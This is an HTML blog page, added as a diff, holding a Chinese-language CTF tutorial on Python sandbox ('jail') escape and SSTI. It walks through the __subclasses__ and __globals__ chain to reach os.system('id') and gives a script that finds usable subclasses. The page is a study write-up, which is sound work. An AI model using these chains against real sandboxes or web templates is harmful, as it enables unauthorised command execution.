@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-84TPQBH5EH');
+</script>
+<!-- End Google Analytics -->
+
+  
+  
+
+  
+  <title>jail | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="ssti 和 jail除去渲染部分其实利用的是一样的，都是寻找执行链条 这里常用用来寻找的几个方法分别为  摘自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;h0cksr&#x2F;p&#x2F;16189741.html  12345678910111213__class__  返回类型所属的对象&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__mro__    返回一个包含对象所继承的基类元组和方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jail">
+<meta property="og:url" content="http://example.com/2024/09/11/jail/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ssti 和 jail除去渲染部分其实利用的是一样的，都是寻找执行链条 这里常用用来寻找的几个方法分别为  摘自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;h0cksr&#x2F;p&#x2F;16189741.html  12345678910111213__class__  返回类型所属的对象&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__mro__    返回一个包含对象所继承的基类元组和方法">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/">
+<meta property="article:published_time" content="2024-09-11T04:59:17.000Z">
+<meta property="article:modified_time" content="2024-09-11T06:22:20.132Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/cloud/">
+                cloud
+                <div class="category-count">2</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-5/">
+                htb-Season-5
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">2</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-6/">
+                htb-Season-6
+                <div class="category-count">5</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/09/11/jail/" title="jail" >
+            <div class="recent-link-text">
+              jail
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/09/09/htb-wp-Sightless/" title="【season-6】 htb Sightless wp" >
+            <div class="recent-link-text">
+              【season-6】 htb Sightless wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/08/28/ycb-2024-pwn1/" title="【羊城杯 2024】 pwn1" >
+            <div class="recent-link-text">
+              【羊城杯 2024】 pwn1
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/08/26/htb-MonitorsThree-wp/" title="【season-6】 htb MonitorsThree wp" >
+            <div class="recent-link-text">
+              【season-6】 htb MonitorsThree wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/08/23/htb-Lantern-wp/" title="【season-6】 htb Lantern wp" >
+            <div class="recent-link-text">
+              【season-6】 htb Lantern wp
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-jail" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cm0xh4rxq0000u4ky2ojg5k3e">
+        <img src="/images/" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        jail
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-09-11T04:59:17.000Z" itemprop="datePublished">2024-09-11</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            5.1k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>ssti 和 jail除去渲染部分其实利用的是一样的，都是寻找执行链条</p>
+<p>这里常用用来寻找的几个方法分别为</p>
+<blockquote>
+<p>摘自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189741.html">https://www.cnblogs.com/h0cksr/p/16189741.html</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组和方法在解析时按照元组的顺序解析。(继承链)</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">//通过以上几个魔法函数找到可利用的模块和<span class="built_in">object</span>父类</span><br><span class="line"></span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">//__dir__()和__dict__可以帮助我们找到需要类方法</span><br><span class="line">__dir__()   更多的可以参考这个文章类特殊成员/函数https://www.cnblogs.com/twotigers/p/<span class="number">7779501.</span>html</span><br><span class="line">__dict__    为了方便用户查看类中包含哪些属性，Python 类提供了 __dict__ 属性。需要注意的一点是，该属性可以用类名或者类的实例对象来调用，用类名直接调用 __dict__，会输出该由类中所有类属性组成的字典；而使用类的实例对象调用 __dict__，会输出由类中所有实例属性组成的字典。</span><br></pre></td></tr></table></figure>
+
+<p>这里我们用一个最基础的str，也就是字符来取他的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到他的基础<code>class</code>（类）是<code>str</code></p>
+<p>此时我们的目的是通过访问他<code>str</code>，再去拿到他的爹，也就是一个<code>正黄旗带通天纹的&#39;object&#39;</code></p>
+<p>也就是所有东西的祖宗，一个最原始的<code>对象</code>object，str是由他衍生的（或者说是继承自object），所以我们可以通过下面这个方式先看下他的基类都有哪些，这里他返回的是元组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>&#39;&#39;</code>所属的<code>str</code>的基类就是object一个</p>
+<p>所以我们可以通过下标，直接引用<code>object</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此刻我们就拿到了基类，爹中爹<code>object</code></p>
+<p>但我们怎么使用呢(x)</p>
+<p>首先我们对object进行一个<code>__subclasses__()</code></p>
+<p><code>__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</code></p>
+<p>我们可以通过<code>subclasses</code>拿到他的子类</p>
+<p>一个比较典型的例子</p>
+<blockquote>
+<p>摘自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Suixing_yuan/article/details/104653691">https://blog.csdn.net/Suixing_yuan/article/details/104653691</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>(<span class="title class_ inherited__">object</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">X</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">X</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">X</span>):<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(X.__subclasses__())</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到他的父类<code>class X</code>，其下<code>A B B</code>都是继承自<code>X</code>，所以这里可以通过<code>X.__subclasses__()</code>进行输出他的所有子类。</p>
+<p>但是它只能显示直系的子类，如果子类又被拿去继承，那他将无法直接通过<code>__subclasses__</code></p>
+<blockquote>
+<p>摘自：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3862310/how-to-find-all-the-subclasses-of-a-class-given-its-name%E8%8E%B7%E5%8F%96">https://stackoverflow.com/questions/3862310/how-to-find-all-the-subclasses-of-a-class-given-its-name获取</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>(<span class="title class_ inherited__">object</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span>(<span class="title class_ inherited__">Foo</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Baz</span>(<span class="title class_ inherited__">Foo</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bing</span>(<span class="title class_ inherited__">Bar</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([cls.__name__ <span class="keyword">for</span> cls <span class="keyword">in</span> Foo.__subclasses__()])</span><br><span class="line"><span class="comment"># [&#x27;Bar&#x27;, &#x27;Baz&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>不过可以通过递归子类的形式再看孙类，如此递归下去子子孙孙延绵不断（x</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">all_subclasses</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>(cls.__subclasses__()).union(</span><br><span class="line">        [s <span class="keyword">for</span> c <span class="keyword">in</span> cls.__subclasses__() <span class="keyword">for</span> s <span class="keyword">in</span> all_subclasses(c)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_subclasses(Foo))</span><br><span class="line"><span class="comment"># &#123;&lt;class &#x27;__main__.Bar&#x27;&gt;, &lt;class &#x27;__main__.Baz&#x27;&gt;, &lt;class &#x27;__main__.Bing&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们进行一个<code>__subclasses__()</code>的查看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Context&#x27;</span>&gt;....]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>object</code>他的子类就肥肠多了，那我们怎么找到能用的呢！</p>
+<h3 id="方法一：人脑超算"><a href="#方法一：人脑超算" class="headerlink" title="方法一：人脑超算"></a>方法一：人脑超算</h3><p>于短短的几千个小对象中，一眼发现在火星时候就经常利用的对象，并且通过脑里的寄存器直接算出位置。</p>
+<p>我曾经在母星的时候就经常使用<code>_GeneratorContextManagerBase</code></p>
+<p>所以一眼就在里面看到了它，并通过寄存器拿到了他的下标是188(x)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;functools._lru_list_elem&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib.AsyncContextDecorator&#x27;&gt;, `&lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;&lt;----这个, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;,</span><br></pre></td></tr></table></figure>
+
+<p>验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[188].__name__</span><br><span class="line">&#x27;_GeneratorContextManagerBase&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以说是非常成功了</p>
+<p>然后再将其实例化，所以这里需要<code>__init__</code>一下，直接取做一个实例</p>
+<p>再通过<code>__globals__</code>,看她下面的可用方法或函数</p>
+<p>在这里，“主要”是通过其中下面这种上层定义时所引用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在Python中，__globals__属性中的函数是通过以下步骤：</span><br><span class="line"></span><br><span class="line">定义：函数首先在模块的顶层被定义。这意味着函数是在模块的全局作用域中创建的，而不是在另一个函数或类的内部。</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以在其中找到各类函数和方法.</p>
+<p>因为知道他这里有<code>os</code>库，所以直接进行一个引得用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[188].__init__.__globals__[&quot;os&quot;].system(&quot;id&quot;)</span><br><span class="line">uid=1000(test)</span><br></pre></td></tr></table></figure>
+
+<p>因为这种方式比较考验天赋，所以不太建议使用，因为每个版本的都有差异，所以死记硬数不太荔枝。</p>
+<h3 id="方法二：jio本跑"><a href="#方法二：jio本跑" class="headerlink" title="方法二：jio本跑"></a>方法二：jio本跑</h3><p>因为只有在拿到挨个执行：基类-》实例化-》查询globals，找目标方法太累，所以可以通过写脚本轮询查找来处理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> i.__init__.__globals__:</span><br><span class="line">            <span class="built_in">print</span>(j,i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#188 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;</span></span><br><span class="line"><span class="comment">#189 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;</span></span><br><span class="line"><span class="comment">#191 &lt;class &#x27;_distutils_hack._TrivialRe&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
